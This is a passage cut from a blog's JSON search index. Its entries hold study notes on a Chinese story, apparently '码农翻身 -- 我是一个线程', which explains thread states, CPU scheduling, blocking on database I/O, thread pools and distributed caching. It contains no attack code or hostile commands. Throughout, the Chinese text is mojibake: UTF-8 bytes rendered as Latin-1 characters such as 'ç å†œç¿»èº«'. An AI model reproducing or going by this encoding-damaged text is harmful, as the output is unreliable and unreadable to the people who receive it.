1","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/"},{"categories":["ç å†œç¿»èº«"],"content":"ç å†œç¿»èº«ä¼˜è´¨æ–‡ç« å­¦ä¹ è®°å½•ã€‚","date":"2021-07-11","objectID":"/2021/07/%E7%A0%81%E5%86%9C%E7%BF%BB%E8%BA%AB--%E6%88%91%E6%98%AF%E4%B8%80%E4%B8%AA%E7%BA%BF%E7%A8%8B-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/","tags":["ç å†œç¿»èº«"],"title":"ç å†œç¿»èº« -- æˆ‘æ˜¯ä¸€ä¸ªçº¿ç¨‹","uri":"/2021/07/%E7%A0%81%E5%86%9C%E7%BF%BB%E8%BA%AB--%E6%88%91%E6%98%AF%E4%B8%80%E4%B8%AA%E7%BA%BF%E7%A8%8B-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["ç å†œç¿»èº«"],"content":"ç¬¬ä¸€å› åˆç”Ÿç‰›çŠŠ æˆ‘æ˜¯ä¸€ä¸ªçº¿ç¨‹ï¼Œæˆ‘ä¸€å‡ºç”Ÿå°±è¢«ç¼–äº†ä¸ªå·ï¼š0x3704ï¼Œç„¶åè¢«é¢†åˆ°ä¸€ä¸ªæ˜æš—çš„å±‹å­é‡Œï¼Œåœ¨è¿™é‡Œæˆ‘å‘ç°äº†å¾ˆå¤šå’Œæˆ‘ä¸€æ¨¡ä¸€æ ·çš„åŒä¼´ã€‚ // çº¿ç¨‹id æˆ‘èº«è¾¹çš„åŒä¼´0x6900 å¾…çš„æ—¶é—´æ¯”è¾ƒé•¿ï¼Œä»–å¸¦ç€æ²§æ¡‘çš„å£æ°”å¯¹æˆ‘è¯´ï¼šâ€œæˆ‘ä»¬çº¿ç¨‹çš„å®¿å‘½å°±æ˜¯å¤„ç†åŒ…è£¹ã€‚æŠŠåŒ…è£¹å¤„ç†å®Œä»¥åè¿˜å¾—é©¬ä¸Šå›åˆ°è¿™é‡Œï¼Œå¦åˆ™å¯èƒ½æ°¸è¿œå›ä¸æ¥äº†ã€‚â€ æˆ‘ä¸€è„¸æ‡µæ‡‚ï¼Œâ€œåŒ…è£¹ï¼Œä»€ä¹ˆåŒ…è£¹ï¼Ÿâ€ â€œä¸è¦ç€æ€¥ï¼Œé©¬ä¸Šä½ å°±ä¼šæ˜ç™½äº†ï¼Œæˆ‘ä»¬è¿™é‡Œæ˜¯ä¸å…»é—²äººçš„ã€‚â€ æœç„¶ï¼Œæ²¡å¤šä¹…ï¼Œå±‹å­çš„é—¨å¼€äº†ï¼Œ ä¸€ä¸ªé¢è²Œå‡¶æ¶çš„å®¶ä¼™å¼é“ï¼šâ€œ0x3704 ,å‡ºæ¥ï¼â€ æˆ‘ä¸€å‡ºæ¥å°±è¢«å¡äº†ä¸€ä¸ªæ²‰ç”¸ç”¸çš„åŒ…è£¹ï¼Œä¸Šé¢è¿˜é™„å¸¦ç€ä¸€ä¸ªå†™æ»¡äº†æ“ä½œæ­¥éª¤çš„çº¸ã€‚ â€œå¿«å»ï¼ŒæŠŠè¿™ä¸ªåŒ…è£¹å¤„ç†äº†ã€‚â€ â€œå»å“ªå„¿å¤„ç†ï¼Ÿâ€ â€œè·Ÿç€æŒ‡ç¤ºèµ°ï¼Œå…ˆåˆ°å°±ç»ªè½¦é—´ã€‚â€ // å…ˆè¿›å…¥å°±ç»ªçŠ¶æ€ æœç„¶ï¼Œåœ°ä¸Šæœ‰æŒ‡ç¤ºç®­å¤´ï¼Œè·Ÿç€å®ƒæ¥åˆ°äº†ä¸€é—´æ˜äº®çš„å¤§å±‹å­ï¼Œè¿™é‡Œå·²ç»æœ‰ä¸å°‘çº¿ç¨‹äº†ï¼Œå¤§å®¶éƒ½å¾ˆç´§å¼ ï¼Œå¥½åƒæ—¶åˆ»å‡†å¤‡ç€å¾€å‰å†²ã€‚ æˆ‘åˆšä¸€è¿›æ¥ï¼Œå°±å¬è§å¹¿æ’­è¯´ï¼šâ€œ0x3704ï¼Œè¿›å…¥è½¦é—´ã€‚â€ æˆ‘èµ¶ç´§å¾€å‰èµ°ï¼Œèº«åæœ‰å¾ˆå¤šäººè®®è®ºã€‚ â€œä»–å¤ªå¹¸è¿äº†ï¼Œåˆšè¿›å…¥å°±ç»ªçŠ¶æ€å°±èƒ½è¿è¡Œã€‚â€ // æœªäº§ç”Ÿç­‰å¾…ï¼Œç›´æ¥ä»å°±ç»ªçŠ¶æ€è½¬å…¥è¿è¡ŒçŠ¶æ€ â€œæ˜¯ä¸æ˜¯æœ‰å…³ç³»ï¼Ÿâ€ â€œä¸æ˜¯ï¼Œä½ çœ‹äººå®¶çš„ä¼˜å…ˆçº§å¤šé«˜å•Šï¼Œå”‰ï¼â€ // ä¸»è¦å› ä¸ºä¼˜å…ˆçº§é«˜äºå…¶ä»–çº¿ç¨‹ å‰è¾¹å°±æ˜¯è½¦é—´ï¼Œè¿™é‡Œç®€ç›´æ˜¯å¤ªç¾äº†ï¼Œæ€ªä¸å¾—è€çº¿ç¨‹æ€»æ˜¯å” å¨ç€è¯´ï¼šâ€œè¦æ˜¯èƒ½ä¸€ç›´å¾…åœ¨è¿™é‡Œå°±å¥½äº†ã€‚â€ // çº¿ç¨‹ä¸€ç›´å¤„äºè¿è¡ŒçŠ¶æ€ï¼Œæ˜¯æ¯ä¸ªçº¿ç¨‹çš„â€œç¨‹ç”Ÿç†æƒ³â€ è¿™é‡Œç©ºé—´å¤§ï¼Œè§†é‡å¥½ï¼Œç©ºæ°”æ¸…æ–°ï¼Œé¸Ÿè¯­èŠ±é¦™ï¼Œè¿˜æœ‰å¾ˆå¤šä»æ¥æ²¡è§è¿‡çš„äººï¼ŒåƒæœåŠ¡å‘˜ä¸€æ ·ç­‰ç€ä¸ºæˆ‘æœåŠ¡ã€‚ ä»–ä»¬ä¹Ÿéƒ½æœ‰ç¼–å·ï¼Œæ›´é‡è¦çš„æ˜¯æ¯ä¸ªäººè¿˜æœ‰ä¸ªæ ‡ç­¾ï¼Œä¸Šé¢å†™ç€ï¼šç¡¬ç›˜ã€æ•°æ®åº“ã€å†…å­˜ã€ç½‘å¡â€¦â€¦ // çº¿ç¨‹è¿è¡Œæ¶‰åŠåˆ°çš„å„ç§èµ„æº æˆ‘ç°åœ¨ç†è§£ä¸äº†ï¼Œçœ‹çœ‹æ“ä½œæ­¥éª¤å§ã€‚ // CPUä¼šæŒ‡å®šçº¿ç¨‹éœ€è¦åšçš„äº‹æƒ… ç¬¬ä¸€æ­¥ï¼šä»åŒ…è£¹ä¸­å–å‡ºå‚æ•°ã€‚ æ‰“å¼€åŒ…è£¹ï¼Œé‡Œè¾¹æœ‰ä¸ªHttpRequestå¯¹è±¡ï¼Œå¯ä»¥å–åˆ°userNameã€ passwordä¸¤ä¸ªå‚æ•°ã€‚ ç¬¬äºŒæ­¥ï¼šæ‰§è¡Œç™»å½•æ“ä½œã€‚ å¥¥ï¼ŒåŸæ¥æ˜¯æœ‰äººè¦ç™»å½•å•Šï¼Œæˆ‘æŠŠuserNameã€passwordäº¤ç»™æ•°æ®åº“æœåŠ¡å‘˜ï¼Œä»–æ‹¿ç€æ•°æ®ï¼Œæ…¢è…¾è…¾åœ°èµ°äº†ã€‚ // æ•°æ®è¯»å†™é€Ÿåº¦è¿œè¿œå°äºçº¿ç¨‹å¤„ç†é€Ÿåº¦ ä»–æ€ä¹ˆè¿™ä¹ˆæ…¢ï¼Ÿä¸è¿‡æˆ‘æ˜¯ä¸æ˜¯æ­£å¥½å¯ä»¥åœ¨è½¦é—´é‡Œå¤šå¾…ä¸€ä¼šå„¿ï¼Ÿåæ­£ä¹Ÿæ²¡æ³•æ‰§è¡Œç¬¬ä¸‰æ­¥ã€‚ å°±åœ¨è¿™æ—¶ï¼Œè½¦é—´é‡Œçš„å¹¿æ’­å“äº†ï¼šâ€œ0x3704ï¼Œæˆ‘æ˜¯CPUï¼Œè®°ä½ä½ æ­£åœ¨æ‰§è¡Œçš„æ­¥éª¤ï¼Œç„¶åé©¬ä¸Šå¸¦ç€åŒ…è£¹ç¦»å¼€ï¼â€ // CPUä¸ä¼šè®©ç©ºé—²çº¿ç¨‹å ç”¨CPU æˆ‘æ…¢è…¾è…¾åœ°å¼€å§‹æ”¶æ‹¾ã€‚ // ä¿å­˜çº¿ç¨‹çš„ä¸Šä¸‹æ–‡ â€œå¿«ç‚¹ï¼Œåˆ«çš„çº¿ç¨‹é©¬ä¸Šå°±è¦è¿›æ¥äº†ã€‚â€ // å¿«æ»šï¼Œåˆ«æµªè´¹èµ„æº ç¦»å¼€è¿™ä¸ªè½¦é—´ï¼Œåˆæ¥åˆ°ä¸€ä¸ªå¤§å±‹å­ï¼Œè¿™é‡Œæœ‰å¾ˆå¤šçº¿ç¨‹åœ¨æ…¢è…¾è…¾åœ°å–èŒ¶ï¼Œæ‰“ç‰Œã€‚ // è¿›å…¥é˜»å¡çŠ¶æ€ï¼Œå°ä¸‘ä¸æ˜¯æˆ‘è‡ªå·±ï¼Œå¤§å®¶éƒ½åœ¨ç­‰CPUçš„æ‰§è¡Œæƒ â€œå“¥ä»¬ï¼Œä½ ä»¬æ²¡äº‹å¹²äº†ï¼Ÿâ€ â€œä½ æ–°æ¥çš„å§ï¼Œä½ ä¸çŸ¥é“æˆ‘åœ¨ç­‰æ•°æ®åº“æœåŠ¡å‘˜ç»™æˆ‘æ•°æ®å•Šï¼æ®è¯´ä»–ä»¬æ¯”æˆ‘ä»¬æ…¢å¥½å‡ åä¸‡å€ï¼Œåœ¨è¿™é‡Œå¥½å¥½æ­‡å§ã€‚â€ // æ•°æ®çš„è¯»å†™é€Ÿåº¦å’Œå¤„ç†é€Ÿåº¦ä¸æ˜¯ä¸€ä¸ªé‡çº§ â€œå•Šï¼Ÿ è¿™ä¹ˆæ…¢ï¼æˆ‘è¿™é‡Œæœ‰äººåœ¨ç™»å½•ç³»ç»Ÿï¼Œèƒ½ç­‰è¿™ä¹ˆé•¿æ—¶é—´å—ï¼Ÿâ€ â€œæ”¾å¿ƒï¼Œä½ æ²¡å¬è¯´è¿‡äººé—´ä¸€å¤©ï¼ŒCPUä¸€å¹´å—ï¼Ÿæˆ‘ä»¬è¿™é‡Œæ˜¯ç”¨çº³ç§’ã€æ¯«ç§’è®¡æ—¶çš„ï¼Œäººé—´ç­‰å¾…ä¸€ç§’ï¼Œç›¸å½“äºæˆ‘ä»¬å¥½å‡ å¤©å‘¢ï¼Œæ¥å¾—åŠã€‚â€ å¹²è„†ç¡ä¸€ä¼šå§ã€‚ä¸çŸ¥é“è¿‡äº†å¤šä¹…ï¼Œå¤§å–‡å­åˆå¼€å§‹å¹¿æ’­äº†ï¼šâ€œ0x3704ï¼Œä½ çš„æ•°æ®æ¥äº†ï¼Œå¿«å»æ‰§è¡Œï¼â€ // å†æ¬¡è·å¾—æ—¶é—´ç‰‡ï¼Œå‡†å¤‡æ‰§è¡Œ æˆ‘è½¬èº«å°±å¾€CPUè½¦é—´è·‘ï¼Œå‘ç°è¿™é‡Œçš„é—¨åªå‡ºä¸è¿›ï¼ // ä¸èƒ½ç›´æ¥è¿›å…¥è¿è¡Œæ€ åé¢ä¼ æ¥é˜µé˜µå“„ç¬‘å£°ï¼šâ€œæœç„¶æ˜¯æ–°äººï¼Œä¸çŸ¥é“è¿˜å¾—å»å°±ç»ªè½¦é—´ç­‰ã€‚â€ // å…ˆè¿›å…¥å°±ç»ªçŠ¶æ€ äºæ˜¯èµ¶ç´§åˆ°å°±ç»ªè½¦é—´ï¼Œè¿™æ¬¡æ²¡æœ‰é‚£ä¹ˆå¥½è¿äº†ï¼Œç­‰äº†å¥½ä¹…æ‰è¢«å†æ¬¡å«è¿›CPUè½¦é—´ã€‚ // åœ¨å°±ç»ªçŠ¶æ€ç­‰å¾…å…¶ä»–çº¿ç¨‹çš„æ—¶é—´ç‰‡æ‰§è¡Œå®Œï¼Œè¯´æ˜æœ‰çš„çº¿ç¨‹çš„ä¼˜å…ˆçº§æ¯”æˆ‘é«˜ åœ¨ç­‰å¾…çš„æ—¶å€™ï¼Œæˆ‘å¬è§æœ‰äººå°å£°è®®è®ºï¼š â€œå¬è¯´äº†å—ï¼Œæœ€è¿‘æœ‰ä¸ªçº¿ç¨‹è¢«killæ‰äº†ã€‚â€ â€œä¸ºå•¥å•Šï¼Ÿâ€ â€œè¿™å®¶ä¼™èµ–åœ¨CPUè½¦é—´ä¸èµ°ï¼ŒæŠŠCPUåˆ©ç”¨ç‡ä¸€ç›´ææˆ100%ï¼Œåæ¥å°±è¢«killæ‰äº†ã€‚â€ // ä¸€ç›´å ç”¨CPUçš„ï¼Œæ€æ— èµ¦ â€œKillæ‰ä»¥åå¼„å“ªå„¿å»äº†ï¼Ÿâ€ â€œå¯èƒ½è¢«åƒåœ¾å›æ”¶äº†å§ã€‚â€ // killçº¿ç¨‹ï¼Œå¹¶å›æ”¶å…¶å ç”¨çš„èµ„æºã€‚CPUæ˜¯å¾ˆé‡è§†èµ„æºåˆ©ç”¨çš„ï¼Œä¸å…è®¸åŠç‚¹æµªè´¹ã€‚ æˆ‘å¿ƒé‡Œæ‰“äº†ä¸ªå¯’å™¤ï¼Œèµ¶ç´§æ¥ç€å¤„ç†ï¼Œå‰©ä¸‹çš„åŠ¨ä½œå¿«å¤šäº†ï¼Œç¬¬äºŒæ­¥ç™»å½•æˆåŠŸã€‚ ç¬¬ä¸‰æ­¥ï¼šæ„å»ºç™»å½•æˆåŠŸåçš„ä¸»é¡µã€‚ è¿™ä¸€æ­¥æœ‰ç‚¹è´¹æ—¶ï¼Œå› ä¸ºæœ‰å¾ˆå¤šHTMLéœ€è¦å¤„ç†ï¼Œä¸çŸ¥é“ä»£ç è°å†™çš„ï¼Œå¤„ç†èµ·æ¥å¾ˆçƒ¦äººã€‚ æˆ‘æ­£åœ¨ç´§å¼ çš„åˆ¶ä½œHTMLå‘¢ï¼Œ CPUåˆå¼€å§‹å«äº†ï¼š â€œ0x3704ï¼Œæˆ‘æ˜¯CPU ï¼Œè®°ä½ä½ æ­£åœ¨æ‰§è¡Œçš„æ­¥éª¤ï¼Œç„¶åé©¬ä¸Šå¸¦ç€åŒ…è£¹ç¦»å¼€ï¼â€ // å†æ¬¡è¢«ä¸­æ–­æ‰§è¡Œ â€œä¸ºå•¥å•Šï¼Ÿâ€ â€œæ¯ä¸ªçº¿ç¨‹åªèƒ½åœ¨CPUä¸Šè¿è¡Œä¸€æ®µæ—¶é—´ï¼Œåˆ°äº†æ—¶é—´å°±å¾—è®©åˆ«äººç”¨äº†ï¼Œä½ å»å°±ç»ªè½¦é—´å¾…ç€ï¼Œç­‰ç€å«ä½ å§ã€‚â€ // æ—¶é—´ç‰‡æ‰§è¡Œç»“æŸï¼Œä¸ç®¡æ‰§è¡Œåˆ°ä½•ç§ç¨‹åº¦ï¼Œé€€å‡ºæ‰§è¡Œï¼Œè½¬å…¥å°±ç»ªçŠ¶æ€ å°±è¿™æ ·ï¼Œæˆ‘ä¸€ç›´åœ¨â€œå°±ç»ªâ€”â€”è¿è¡Œâ€è¿™ä¸¤ä¸ªçŠ¶æ€ä¸­ä¸çŸ¥é“è½®è½¬äº†å¤šå°‘æ¬¡ï¼Œ ç»ˆäºæŒ‰ç…§æ­¥éª¤æ¸…å•æŠŠå·¥ä½œåšå®Œäº†ã€‚ // å¤šæ¬¡çš„çŠ¶æ€è½¬æ¢ï¼Œç›´åˆ°åŠ¨ä½œæ‰§è¡Œå®Œæˆ æœ€åé¡ºåˆ©åœ°æŠŠåŒ…å«htmlçš„åŒ…è£¹å‘äº†å›å»ã€‚è‡³äºç™»å½•ä»¥åå¹²ä»€ä¹ˆäº‹å„¿ï¼Œæˆ‘å°±ä¸ç®¡äº†ã€‚é©¬ä¸Šå°±è¦å›åˆ°æˆ‘é‚£æ˜æš—çš„æˆ¿é—´äº†ï¼ŒçœŸæœ‰ç‚¹èˆä¸å¾—è¿™é‡Œã€‚ä¸è¿‡ç›¸å¯¹äºæœ‰äº›çº¿ç¨‹ï¼Œæˆ‘è¿˜æ˜¯å¹¸è¿çš„ï¼Œä»–ä»¬è¿è¡Œå®Œä»¥åå°±è¢«å½»åº•åœ°é”€æ¯äº†ï¼Œè€Œæˆ‘è¿˜æ´»ç€ï¼ // è¿è¡Œå®Œåæ²¡æœ‰è¢«é”€æ¯ å›åˆ°äº†å°é»‘å±‹ï¼Œè€çº¿ç¨‹0x6900é—®ï¼š â€œæ€ä¹ˆæ ·ï¼Ÿç¬¬ä¸€å¤©æœ‰ä»€ä¹ˆæ„Ÿè§‰ï¼Ÿâ€ â€œæˆ‘ä»¬çš„ä¸–ç•Œè§„åˆ™å¾ˆå¤æ‚ï¼Œé¦–å…ˆä½ ä¸çŸ¥é“ä»€ä¹ˆæ—¶å€™ä¼šè¢«æŒ‘ä¸­æ‰§è¡Œï¼›ç¬¬äºŒï¼Œåœ¨æ‰§è¡Œçš„è¿‡ç¨‹ä¸­éšæ—¶å¯èƒ½è¢«æ‰“æ–­ï¼Œè®©å‡ºCPUè½¦é—´ï¼›ç¬¬ä¸‰ï¼Œä¸€æ—¦å‡ºç°ç¡¬ç›˜ã€æ•°æ®åº“è¿™æ ·è€—æ—¶çš„æ“ä½œï¼Œä¹Ÿå¾—è®©å‡ºCPUå»ç­‰å¾…ï¼›ç¬¬å››ï¼Œå°±æ˜¯æ•°æ®æ¥äº†ï¼Œä½ ä¹Ÿä¸ä¸€å®šé©¬ä¸Šæ‰§è¡Œï¼Œè¿˜å¾—ç­‰ç€CPUæŒ‘é€‰ã€‚â€ // çº¿ç¨‹è¿è¡Œçš„åŸºæœ¬åŸåˆ™ â€œå°ä¼™å­ç†è§£çš„ä¸é”™å•Šã€‚â€ â€œæˆ‘ä¸æ˜ç™½ä¸ºä»€ä¹ˆå¾ˆå¤šçº¿ç¨‹æ‰§è¡Œå®Œä»»åŠ¡å°±æ­»äº†ï¼Œä¸ºä»€ä¹ˆå’±ä»¬è¿˜æ´»ç€ï¼Ÿâ€ â€œä½ è¿˜ä¸çŸ¥é“ï¼Ÿé•¿ç”Ÿä¸è€æ˜¯æˆ‘ä»¬çš„ç‰¹æƒï¼æˆ‘ä»¬è¿™é‡Œæœ‰ä¸ªæ­£å¼çš„åç§°ï¼Œå«ä½œçº¿ç¨‹æ± ï¼â€ // å› ä¸ºå±äºçº¿ç¨‹æ± çš„çº¿ç¨‹ï¼Œå¹¶æ²¡æœ‰åœ¨è¿è¡Œç»“æŸåè¢«é”€æ¯ ","date":"2021-07-11","objectID":"/2021/07/%E7%A0%81%E5%86%9C%E7%BF%BB%E8%BA%AB--%E6%88%91%E6%98%AF%E4%B8%80%E4%B8%AA%E7%BA%BF%E7%A8%8B-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/:1:0","tags":["ç å†œç¿»èº«"],"title":"ç å†œç¿»èº« -- æˆ‘æ˜¯ä¸€ä¸ªçº¿ç¨‹","uri":"/2021/07/%E7%A0%81%E5%86%9C%E7%BF%BB%E8%BA%AB--%E6%88%91%E6%98%AF%E4%B8%80%E4%B8%AA%E7%BA%BF%E7%A8%8B-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["ç å†œç¿»èº«"],"content":"ç¬¬äºŒå› æ¸å…¥ä½³å¢ƒ å¹³æ·¡çš„æ—¥å­å°±è¿™ä¹ˆä¸€å¤©å¤©åœ°è¿‡å»ï¼Œä½œä¸ºä¸€ä¸ªçº¿ç¨‹ï¼Œæˆ‘æ¯å¤©çš„ç”Ÿæ´»éƒ½æ˜¯å–åŒ…è£¹ã€å¤„ç†åŒ…è£¹ï¼Œç„¶åå›åˆ°æˆ‘ä»¬æ˜æš—çš„å®¶ï¼šçº¿ç¨‹æ± ã€‚ æœ‰ä¸€å¤©æˆ‘å›æ¥çš„æ—¶å€™ï¼Œå¬åˆ°æœ‰ä¸ªå…„å¼Ÿè¯´ï¼Œä»Šå¤©è¦å¥½å¥½ä¼‘æ¯ä¸‹ï¼Œæ˜å¤©å°±æ˜¯æœ€ç–¯ç‹‚çš„ä¸€å¤©ã€‚æˆ‘çœ‹äº†ä¸€çœ¼æ—¥å†ï¼Œæ˜å¤©æ˜¯ 11æœˆ11å·ã€‚ // åŒ11å¤§æˆ˜ æœç„¶ï¼Œé›¶ç‚¹åˆšè¿‡ï¼Œä¸çŸ¥é“é‚£äº›äººç±»æ€ä¹ˆäº†ï¼Œç–¯ç‹‚åœ°æŠ•é€’åŒ…è£¹ï¼Œä¸ºäº†åº”ä»˜èœ‚æ‹¥è€Œè‡³çš„æµ·é‡åŒ…è£¹ï¼Œçº¿ç¨‹æ± é‡Œæ²¡æœ‰ä¸€ä¸ªäººèƒ½é—²ä¸‹æ¥ï¼Œå…¨éƒ¨å‡ºå»å¤„ç†åŒ…è£¹ï¼ŒCPUè½¦é—´åˆ©ç”¨ç‡è¶…é«˜ï¼Œç¡¬ç›˜åœ¨å—¡å—¡è½¬ï¼Œç½‘å¡ç–¯ç‹‚çš„é—ªï¼Œå³ä¾¿å¦‚æ­¤ï¼Œè¿˜æ˜¯å¤„ç†ä¸å®Œï¼Œå †ç§¯å¦‚å±±ã€‚ æˆ‘ä»¬ä¹Ÿæ²¡æœ‰åŠæ³•ï¼Œå®åœ¨æ˜¯å¤ªå¤šå¤ªå¤šäº†ï¼Œè¿™äº›åŒ…è£¹ä¸­å¤§éƒ¨åˆ†éƒ½æ˜¯æµè§ˆé¡µé¢ï¼Œä¸‹è®¢å•ï¼Œä¹°ã€ä¹°ã€ä¹°ã€‚ ä¸çŸ¥é“è¿‡äº†å¤šä¹…ï¼ŒåŒ…è£¹å±±ç»ˆäºæ…¢æ…¢åœ°æ¶ˆå¤±äº†ã€‚ç»ˆäºèƒ½å¤Ÿå–˜å£æ°”ï¼Œæˆ‘æƒ³æˆ‘æ°¸è¿œéƒ½ä¸ä¼šå¿˜è®°è¿™ä¸€å¤©ã€‚ é€šè¿‡è¿™ä¸ªäº‹ä»¶ï¼Œæˆ‘æ˜ç™½äº†æˆ‘æ‰€å¤„çš„ä¸–ç•Œï¼šè¿™æ˜¯ä¸€ä¸ªç”µå­å•†åŠ¡çš„ç½‘ç«™ï¼ æˆ‘æ¯å¤©çš„å·¥ä½œå°±æ˜¯å¤„ç†ç”¨æˆ·çš„ç™»å½•ï¼Œæµè§ˆï¼Œè´­ç‰©è½¦ï¼Œä¸‹å•ï¼Œä»˜æ¬¾ã€‚ æˆ‘é—®çº¿ç¨‹æ± çš„å…ƒè€0x6900ï¼šâ€œæˆ‘ä»¬è¦å·¥ä½œåˆ°ä»€ä¹ˆæ—¶å€™ï¼Ÿâ€ â€œè¦ä¸€ç›´ç­‰åˆ°ç³»ç»Ÿé‡å¯çš„é‚£ä¸€åˆ»ã€‚â€0x6900è¯´ã€‚ â€œé‚£ä½ ç»å†è¿‡ç³»ç»Ÿé‡å¯å—ï¼Ÿâ€ â€œæ€ä¹ˆå¯èƒ½ï¼Ÿç³»ç»Ÿé‡å¯å°±æ˜¯æˆ‘ä»¬çš„æ­»äº¡æ—¶åˆ»ï¼Œä¹Ÿå°±æ˜¯ä¸–ç•Œæœ«æ—¥ï¼Œä¸€æ—¦é‡å¯ï¼Œæ•´ä¸ªçº¿ç¨‹æ± å…¨éƒ¨é”€æ¯ï¼Œæ—¶é—´å’Œç©ºé—´å…¨éƒ¨æ¶ˆå¤±ï¼Œä¸€åˆ‡ä»å¤´å†æ¥ã€‚â€ // ç³»ç»Ÿé‡å¯ï¼Œçº¿ç¨‹æ± é”€æ¯é‡æ–°å»ºç«‹ï¼Œå†…å­˜ç©ºé—´é‡æ–°åˆ†é…ï¼Œçº¿ç¨‹é‡æ–°åˆ›å»º â€œé‚£ä»€ä¹ˆæ—¶å€™ä¼šé‡å¯ï¼Ÿâ€ â€œè¿™å°±ä¸å¥½è¯´äº†ï¼Œå¥½å¥½äº«å—çœ¼å‰çš„ç”Ÿæ´»å§â€¦â€¦â€ å…¶å®ç”Ÿæ´»è¿˜æ˜¯ä¸°å¯Œå¤šå½©çš„ï¼Œæˆ‘æœ€å–œæ¬¢çš„åŒ…è£¹æ˜¯ä¸Šä¼ å›¾ç‰‡ï¼Œç”±äºç½‘ç»œæ…¢ï¼Œæ‰€ä»¥èƒ½åœ¨å°±ç»ªè½¦é—´ã€CPUè½¦é—´å¾…å¾ˆé•¿å¾ˆé•¿æ—¶é—´ï¼Œå¯ä»¥è®¤è¯†å¾ˆå¤šå¥½ç©çš„çº¿ç¨‹ã€‚// ç½‘ç»œçš„ä¼ è¾“é€Ÿåº¦æ›´æ…¢ï¼Œæ‰€ä»¥çº¿ç¨‹ä¼šç­‰å¾…æ›´é•¿çš„æ—¶é—´ æ¯”å¦‚è¯´ä¸Šæ¬¡è®¤è¯†äº†memecached çº¿ç¨‹ï¼Œä»–å¯¹æˆ‘è¯´åœ¨ä»–çš„å¸®åŠ©ä¸‹ç¼“å­˜äº†å¾ˆå¤šçš„ç”¨æˆ·æ•°æ®ï¼Œè¿˜æ˜¯åˆ†å¸ƒå¼çš„ï¼å¾ˆå¤šæœºå™¨ä¸Šéƒ½æœ‰ï¼// åˆ†å¸ƒå¼ç¼“å­˜ï¼Œè¿˜æœ‰redis æˆ‘é—®ä»–ï¼šâ€œæ€ªä¸å¾—åæ¥çš„ç™»å½•æ“ä½œå¿«äº†é‚£ä¹ˆå¤šï¼ŒåŸæ¥æ˜¯ä¸å†ä»æ•°æ®åº“å–æ•°æ®äº†ä½ é‚£é‡Œå°±æœ‰å•Šï¼Œå“å¯¹äº†ä½ æ˜¯åˆ†å¸ƒå¼çš„ä½ å»è¿‡åˆ«çš„æœºå™¨æ²¡æœ‰ï¼Ÿâ€ // ç¼“å­˜çš„ç›®çš„å°±æ˜¯å°½å¯èƒ½å‡å°‘æ—¶é—´é•¿çš„æ•°æ®åº“è¯»æ“ä½œï¼Œç›´æ¥ä»å†…å­˜ä¸­è¯»å–ç»å¸¸ä½¿ç”¨çš„æ•°æ®ï¼Œé€Ÿåº¦ä¼šè·å¾—å¾ˆå¤§æå‡ ä»–è¯´ï¼šâ€œæ€ä¹ˆå¯èƒ½ï¼æˆ‘æ¯æ¬¡ä¹Ÿåªèƒ½é€šè¿‡ç½‘ç»œå¾€é‚£ä¸ªæœºå™¨å‘é€ä¸€ä¸ªGETã€PUTå‘½ä»¤æ‰å­˜å–æ•°æ®è€Œå·²ï¼Œåˆ«çš„ä¸€æ¦‚ä¸çŸ¥ã€‚â€ å†æ¯”å¦‚è¯´ä¸Šæ¬¡åœ¨ç­‰å¾…çš„æ—¶å€™é‡åˆ°äº†æ•°æ®åº“è¿æ¥çš„çº¿ç¨‹ï¼Œæˆ‘æ‰çŸ¥é“ä»–é‚£é‡Œä¹Ÿæ˜¯ä¸€ä¸ªè¿æ¥æ± ï¼Œå’Œæˆ‘ä»¬çš„çº¿ç¨‹æ± å‡ ä¹ä¸€æ¨¡ä¸€æ ·ã€‚ // å‡å°‘åˆ›å»ºçº¿ç¨‹çš„å¼€é”€ ä»–å‘Šè¯‰æˆ‘ï¼šâ€œæœ‰äº›åŒ…è£¹å¤ªå˜æ€äº†ï¼Œç«Ÿç„¶æŸ¥çœ‹ä¸€å¹´çš„è®¢å•æ•°æ®ï¼Œç®€ç›´æŠŠæˆ‘ç´¯æ­»äº†ã€‚â€ // å¤§é‡æ•°æ®å¤„ç†æƒ…å†µ æˆ‘è¯´ï¼šâ€œæ‹‰å€’å§ä½ ï¼Œä½ é‚£æ˜¯çº¯æ•°æ®ï¼Œä½ æŠŠæ•°æ®ä¼ ç»™æˆ‘ä»¥åï¼Œæˆ‘è¿˜å¾—ç»„è£…æˆHTMLï¼Œå·¥ä½œé‡ä¸çŸ¥é“æ¯”ä½ å¤§å¤šå°‘å€ã€‚â€ ä»–å»ºè®®æˆ‘ï¼šâ€œä½ ä¸€å®šè¦å’Œmemecachedæå¥½å…³ç³»ï¼Œç›´æ¥ä»ä»–é‚£å„¿æ‹¿æ•°æ®ï¼Œå°½é‡å°‘ç›´æ¥è°ƒç”¨æ•°æ®åº“ï¼Œè¿™æ ·æˆ‘ä»¬JDBC connectionä¹Ÿèƒ½æ´»å¾—è½»æ¾ç‚¹ã€‚â€ æˆ‘æ¬£ç„¶æ¥çº³ï¼šâ€œå¥½å•Šå¥½å•Šï¼Œå…³é”®æ˜¯ä½ å¾—æå‰æŠŠæ•°æ®æåˆ°ç¼“å­˜å•Šï¼Œè¦ä¸ç„¶æˆ‘å…ˆé—®ä¸€éç¼“å­˜ï¼Œæ²¡æœ‰æ•°æ®ï¼Œæˆ‘è¿™ä¸è¿˜å¾—æ‰¾ä½ å—ï¼Ÿâ€ ç”Ÿæ´»å°±æ˜¯è¿™æ ·ï¼Œå¦‚æœä½ è‡ªå·±ä¸æ‰¾ç‚¹ä¹å­ï¼Œè¿˜æœ‰ä»€ä¹ˆæ„æ€ï¼Ÿ ","date":"2021-07-11","objectID":"/2021/07/%E7%A0%81%E5%86%9C%E7%BF%BB%E8%BA%AB--%E6%88%91%E6%98%AF%E4%B8%80%E4%B8%AA%E7%BA%BF%E7%A8%8B-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/:2:0","tags":["ç å†œç¿»èº«"],"title":"ç å†œç¿»èº« -- 